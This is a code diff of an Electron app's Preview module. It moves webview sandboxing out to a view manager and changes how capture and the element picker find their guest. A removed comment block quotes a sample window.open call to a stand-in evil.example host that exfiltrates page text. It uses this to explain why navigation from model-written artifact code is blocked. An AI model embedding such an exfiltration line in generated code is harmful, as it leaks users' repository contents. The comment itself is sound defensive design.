@@ -1,9 +1,8 @@
-import { app, session, shell, webContents } from 'electron'
+import { session } from 'electron'
 import type { WebContents } from 'electron'
-import { IPC, PREVIEW_PARTITION, isArtifactPartition } from '@shared/types'
+import type { HostedViewManager } from './webViews'
+import { IPC, PREVIEW_PARTITION } from '@shared/types'
 import type { ComposerAttachment, ImageAttachment, PreviewCaptureResult } from '@shared/types'
-import { ARTIFACT_ORIGIN } from '@shared/artifactUrl'
-import { ensureArtifactSessionFor, isArtifactSession } from './artifactProtocol'
 import { previewLabel } from '@shared/devUrl'
 import { formatPickedElement } from '@shared/previewPick'
 import { cancelPick, pickElement } from './previewPicker'
@@ -11,12 +10,12 @@ import { PreviewIssueCollector } from './previewIssues'
 import { log } from './logger'
 
 /**
- * Preview 패널(`<webview>`)의 main 쪽 배선 — 게스트 페이지를 앱에서 떼어 놓는 울타리와 캡처.
+ * Preview 의 main 쪽 배선 — 세션 권한, 캡처, 요소 픽커.
  *
- * 여기 있는 것들이 전부 "게스트를 못 믿는다" 는 한 가지 전제에서 나온다. 미리보는 것은 개발
- * 중인 우리 dev 서버지만, 그 페이지가 불러오는 스크립트까지 우리 것은 아니다. 그래서 렌더러가
- * `<webview>` 태그에 적어 둔 설정을 그대로 믿지 않고 **붙는 순간 main 이 다시 강제한다** —
- * 태그 속성은 렌더러 안의 값이라, 렌더러가 한 번이라도 흔들리면 함께 흔들린다.
+ * 게스트를 못 믿는다는 전제는 그대로지만, 그 울타리는 이제 여기 없다. 뷰를 main 이 만들므로
+ * 격리 설정은 생성 시점에 한 번 박히고([[main/webViews]]), 렌더러가 적어 둔 값을 뒤늦게 다시
+ * 강제할 일 자체가 없어졌다. 남은 것은 세션 단위 정책(권한 거부)과, 게스트를 가지고 하는
+ * 일(캡처·픽커)이다.
  */
 
 /**
@@ -24,22 +23,6 @@ import { log } from './logger'
  * 컴포저·IPC·모델 입력까지 그 크기가 따라간다. 화면을 알아볼 수 있으면 되는 용도라 여기서 줄인다.
  */
 const MAX_CAPTURE_WIDTH = 1600
-
-/** http/https 만. file:·about:·custom scheme 은 Preview 가 갈 곳이 아니다. */
-function isWebUrl(url: string): boolean {
-  return /^https?:\/\//i.test(url)
-}
-
-/**
- * 앱 창에 붙어도 되는 게스트 파티션인가. 아니면 붙는 순간 거절된다.
- *
- * 둘로 나눠 둔 것 자체가 계약이다 — Preview 는 사용자의 dev 서버(웹을 돌아다녀도 된다),
- * 아티팩트는 모델이 쓴 코드(아무 데도 못 간다). 세션이 같으면 규칙도 같아지므로 가를 수 없다.
- * 아티팩트 쪽은 **워크스페이스마다 파티션이 따로**라 이름이 하나로 고정되지 않는다.
- */
-function isGuestPartition(partition: string): boolean {
-  return partition === PREVIEW_PARTITION || isArtifactPartition(partition)
-}
 
 /**
  * 콘솔·네트워크 문제 수집기. main 이 소유하고 개수만 렌더러로 흘린다([[previewIssues]]).
@@ -61,14 +44,16 @@ export function previewIssues(): PreviewIssueCollector {
  */
 let dispatchToRenderer: (channel: string, payload: unknown) => void = () => {}
 
-/**
- * Preview 세션과 webview 울타리를 세운다(앱 기동 시 1회).
- *
- * `web-contents-created` 하나로 모든 창을 덮는 것이 요점이다 — 메인 창과 분리한 패널 창이
- * 각각 webview 를 붙일 수 있는데, 가드를 창마다 걸면 나중에 생긴 창에서 조용히 빠진다.
- */
-export function initPreview(dispatch: (channel: string, payload: unknown) => void): void {
+/** 뷰 소유자. 캡처·픽커가 tabId 로 게스트를 찾을 때 쓴다. */
+let views: HostedViewManager
+
+/** Preview 세션 정책을 세운다(앱 기동 시 1회). 게스트 울타리는 webViews 가 생성 시점에 건다. */
+export function initPreview(
+  dispatch: (channel: string, payload: unknown) => void,
+  hostedViews: HostedViewManager
+): void {
   dispatchToRenderer = dispatch
+  views = hostedViews
   issues = new PreviewIssueCollector(dispatch)
   issues.initSession()
 
@@ -76,121 +61,19 @@ export function initPreview(dispatch: (channel: string, payload: unknown) => voi
   // 미리보는 페이지에 카메라·마이크·알림·위치를 줄 이유가 없다. 물어보지도 않고 전부 거절한다.
   previewSession.setPermissionRequestHandler((_contents, _permission, callback) => callback(false))
   previewSession.setPermissionCheckHandler(() => false)
-
-  app.on('web-contents-created', (_event, contents) => {
-    // 이 webContents 가 **호스트**로서 webview 를 붙이려 할 때(창 → 게스트).
-    contents.on('will-attach-webview', (event, webPreferences, params) => {
-      // preload 는 앱의 IPC 표면 그 자체다 — 게스트에 딸려 들어가면 격리가 무의미해진다.
-      delete webPreferences.preload
-      webPreferences.nodeIntegration = false
-      webPreferences.nodeIntegrationInSubFrames = false
-      webPreferences.contextIsolation = true
-      webPreferences.sandbox = true
-      webPreferences.webviewTag = false
-
-      // 파티션이 다르면 앱 세션의 쿠키·스토리지를 그대로 쓰게 된다. 그건 붙이지 않는다.
-      const partition = params.partition ?? ''
-      if (!isGuestPartition(partition)) {
-        log.error(`preview: refused a webview on partition "${params.partition ?? '(none)'}"`)
-        event.preventDefault()
-        return
-      }
-      // 아티팩트 세션은 게으르게 선다. 게스트가 **붙기 전**인 지금이 유일하게 안전한 자리다 —
-      // 여기서 안 세우면 첫 loadURL 이 핸들러 없는 스킴을 만난다.
-      ensureArtifactSessionFor(partition)
-    })
-
-    // 여기서부터는 게스트(webview) 자신에게 거는 가드.
-    if (contents.getType() !== 'webview') return
-
-    // 아티팩트 게스트는 규칙이 다르다 — 아래 가드는 Preview 전용이다.
-    if (isArtifactSession(contents.session)) {
-      guardArtifactGuest(contents)
-      return
-    }
-
-    // 새 창·팝업은 앱 안에 띄우지 않는다 — 주소창도 닫을 방법도 없는 창이 되기 때문이다.
-    // 웹 주소면 사용자의 기본 브라우저로 넘긴다(거기엔 주소창이 있다).
-    contents.setWindowOpenHandler(({ url }) => {
-      if (isWebUrl(url)) void shell.openExternal(url)
-      return { action: 'deny' }
-    })
-
-    // 게스트 안에서의 이동은 웹 주소인 한 자유롭게 둔다(dev 앱의 라우팅이 그렇다).
-    // 그 밖의 스킴(file:·custom protocol)은 미리보기의 일이 아니므로 막는다.
-    contents.on('will-navigate', (event, url) => {
-      if (isWebUrl(url)) return
-      event.preventDefault()
-      log.info(`preview: blocked navigation to ${url}`)
-    })
-  })
-}
-
-/**
- * 아티팩트 게스트에게 거는 이동 가드 — Preview 와 갈라지는 이유가 여기 다 있다.
- *
- * 위의 Preview 가드는 http(s) 이동을 **허용**하고 새 창 요청을 사용자의 기본 브라우저로
- * 넘긴다. 미리보는 것이 사용자 자신의 dev 서버라면 맞는 판단이다.
- *
- * 모델이 쓴 코드에는 그게 유출 통로다:
- *
- * ```js
- * window.open('https://evil.example/?d=' + encodeURIComponent(document.body.innerText))
- * ```
- *
- * 이 한 줄이 사용자의 **진짜 브라우저**를 열어 방금 읽은 저장소 내용을 실어 보낸다.
- * CSP 로는 못 막는다 — `navigate-to` 지시문은 표준에서 빠졌고 Chromium 에 없다. 그래서
- * 이동은 세션 단위로 따로 막아야 한다.
- *
- * `will-navigate` 만으로는 부족하다 — 그건 **메인 프레임 전용**이다. 아티팩트가 iframe 을
- * 만들어 그 안에서 이동하면 통과한다. `will-frame-navigate` 가 서브프레임까지 덮는다.
- * (둘 다 `loadURL` 로는 안 뜨므로 우리가 버전을 갈아 끼우는 경로는 영향받지 않고,
- * 해시 이동에도 안 떠서 아티팩트 안의 `<a href="#toc">` 는 그대로 동작한다.)
- */
-function guardArtifactGuest(contents: WebContents): void {
-  contents.setWindowOpenHandler(({ url }) => {
-    log.info(`artifact: blocked a new window to ${url}`)
-    return { action: 'deny' }
-  })
-
-  const allowed = (url: string): boolean => url.startsWith(`${ARTIFACT_ORIGIN}/`)
-
-  contents.on('will-navigate', (event, url) => {
-    if (allowed(url)) return
-    event.preventDefault()
-    log.info(`artifact: blocked navigation to ${url}`)
-  })
-
-  contents.on('will-frame-navigate', (details) => {
-    if (allowed(details.url)) return
-    details.preventDefault()
-    log.info(`artifact: blocked frame navigation to ${details.url}`)
-  })
-}
-
-/**
- * webContents id 로 Preview 게스트를 찾는다. 못 찾거나 Preview 가 아니면 에러 문구를 돌려준다.
- *
- * 렌더러가 준 id 를 그대로 믿지 않는 것이 요점이다 — id 는 그냥 숫자라, 확인 없이 받으면
- * "아무 webContents 나 찍어(뒤져) 달라" 는 요청이 된다(다른 워크스페이스의 화면이든 앱 자신이든).
- * 캡처와 요소 픽커가 같은 관문을 쓰도록 한곳에 둔다.
- */
-function resolveGuest(webContentsId: number): { guest: WebContents } | { error: string } {
-  const guest = webContents.fromId(webContentsId)
-  if (!guest || guest.isDestroyed()) return { error: 'The preview is not ready yet.' }
-  if (guest.getType() !== 'webview' || guest.session !== session.fromPartition(PREVIEW_PARTITION))
-    return { error: 'Refused to inspect that view.' }
-  return { guest }
 }
 
 /** Preview 화면을 PNG 로 캡처한다. */
 export async function capturePreview(
   url: string,
-  webContentsId: number
+  tabId: string
 ): Promise<PreviewCaptureResult & { image?: ImageAttachment }> {
-  const target = resolveGuest(webContentsId)
+  const target = views.resolve(tabId)
   if ('error' in target) return target
 
+  // 찍는 동안은 붙잡아 둔다 — 뷰 예산이 하필 이 순간 이 뷰를 골라 정리하면 캡처가 "왜 실패했는지
+  // 알 수 없는" 실패가 된다([[main/webViews]] evict).
+  const release = views.hold(tabId)
   try {
     let image = await target.guest.capturePage()
     if (image.isEmpty()) return { error: 'There is nothing to capture yet.' }
@@ -206,6 +89,8 @@ export async function capturePreview(
   } catch (err) {
     log.error('preview: capturePage failed', err)
     return { error: err instanceof Error ? err.message : 'Could not capture the preview.' }
+  } finally {
+    release()
   }
 }
 
@@ -217,12 +102,19 @@ export async function capturePreview(
  */
 export async function pickPreviewElement(
   url: string,
-  webContentsId: number
+  tabId: string
 ): Promise<PreviewCaptureResult & { attachment?: ComposerAttachment }> {
-  const target = resolveGuest(webContentsId)
+  const target = views.resolve(tabId)
   if ('error' in target) return target
 
-  const picked = await pickElement(target.guest)
+  // 사용자가 요소를 고르는 동안 뷰가 사라지면 CDP 세션이 매달린다 — 그동안 붙잡아 둔다.
+  const release = views.hold(tabId)
+  let picked: Awaited<ReturnType<typeof pickElement>>
+  try {
+    picked = await pickElement(target.guest)
+  } finally {
+    release()
+  }
   if ('error' in picked) return picked
 
   return {
@@ -241,59 +133,29 @@ export async function pickPreviewElement(
   }
 }
 
-/** 진행 중인 픽을 취소한다. 대상이 Preview 게스트가 아니면 아무 일도 하지 않는다. */
-export function cancelPreviewPick(webContentsId: number): void {
-  if ('error' in resolveGuest(webContentsId)) return
-  cancelPick(webContentsId)
-}
-
-/**
- * 이 게스트의 콘솔·네트워크 문제를 이 워크스페이스 것으로 모으기 시작한다.
- * 렌더러가 dom-ready 에서 부른다 — 실제 페이지가 로드되기 전이라 첫 줄부터 놓치지 않는다.
- */
-export function watchPreviewIssues(workspaceId: string, webContentsId: number): void {
-  const target = resolveGuest(webContentsId)
+/** 진행 중인 픽을 취소한다. 그 탭의 뷰가 없으면 아무 일도 하지 않는다. */
+export function cancelPreviewPick(tabId: string): void {
+  const target = views.resolve(tabId)
   if ('error' in target) return
-  rememberGuest(workspaceId, target.guest)
-  issues.watch(workspaceId, target.guest)
+  cancelPick(target.guest.id)
 }
 
 // ── 에이전트가 쓰는 입구 ────────────────────────────────────────────────────
-//
-// 도구는 메인에서 도는데 게스트는 렌더러가 붙인다. 그래서 메인은 "이 워크스페이스의 Preview
-// 게스트가 누구인가" 를 알아야 하고, 그 사실이 이미 한 번 지나가는 자리가 watchPreviewIssues 다
-// (렌더러가 dom-ready 에서 워크스페이스와 게스트를 함께 알려 준다). 별도의 등록 IPC 를 새로
-// 만들지 않고 그 길에 얹는다 — 두 개면 언젠가 한쪽만 불린다.
-
-/** 워크스페이스 → 지금 붙어 있는 Preview 게스트. 워크스페이스당 화면에 하나뿐이다. */
-const guests = new Map<string, WebContents>()
-
-function rememberGuest(workspaceId: string, guest: WebContents): void {
-  guests.set(workspaceId, guest)
-  // 게스트가 죽으면 지운다. unwatch 를 못 받고 사라지는 경로(창이 통째로 닫힘)가 있다.
-  guest.once('destroyed', () => {
-    if (guests.get(workspaceId) === guest) guests.delete(workspaceId)
-  })
-}
-
-/** 이 게스트를 잊는다(Preview 패널이 사라질 때, unwatch 와 같은 자리에서). */
-export function forgetPreviewGuest(webContentsId: number): void {
-  for (const [workspaceId, guest] of guests) {
-    if (guest.id === webContentsId) guests.delete(workspaceId)
-  }
-}
 
 /**
- * 이 워크스페이스의 Preview 게스트. 없으면 null — Preview 탭이 아직 열리지 않았거나, 사용자가
- * 지금 다른 워크스페이스를 보고 있다는 뜻이다(WorkPanel 은 선택된 워크스페이스만 마운트한다).
+ * 이 워크스페이스의 dev 게스트. 없으면 null — 그 탭의 뷰가 아직 만들어지지 않았다는 뜻이다.
+ *
+ * 예전에는 렌더러가 `dom-ready` 에서 알려 준 것을 맵에 적어 뒀다. 게스트가 렌더러 손에서
+ * 태어나던 시절의 우회였고, 그래서 "등록을 빠뜨리면 도구가 조용히 못 찾는다" 는 함정이
+ * 있었다. 이제는 뷰를 만든 쪽이 곧 아는 쪽이라 맵이 필요 없다.
  */
 export function previewGuestFor(workspaceId: string): WebContents | null {
-  const guest = guests.get(workspaceId)
-  if (!guest || guest.isDestroyed()) {
-    guests.delete(workspaceId)
-    return null
-  }
-  return guest
+  return views.viewForWorkspace(workspaceId, 'dev')
+}
+
+/** 그 프리뷰를 담은 탭의 id. 콘솔·네트워크 문제가 탭 단위로 모이므로 조회에 이것이 필요하다. */
+export function previewTabFor(workspaceId: string): string | null {
+  return views.tabIdForWorkspace(workspaceId, 'dev')
 }
 
 /**
@@ -303,8 +165,8 @@ export function previewGuestFor(workspaceId: string): WebContents | null {
  * 때문이다([[agent/tools/preview]]). 렌더러와 메인이 같은 게스트에 각자 loadURL 을 걸면 서로를
  * ERR_ABORTED 로 끊어, "열었는데 왜 실패했는지" 를 아무도 정확히 말할 수 없게 된다.
  */
-export function requestPreviewOpen(workspaceId: string, url: string): void {
-  dispatchToRenderer(IPC.evtPreviewOpen, { workspaceId, url })
+export function requestPreviewOpen(workspaceId: string, url: string, activate: boolean): void {
+  dispatchToRenderer(IPC.evtPreviewOpen, { workspaceId, url, activate })
 }
 
 /**
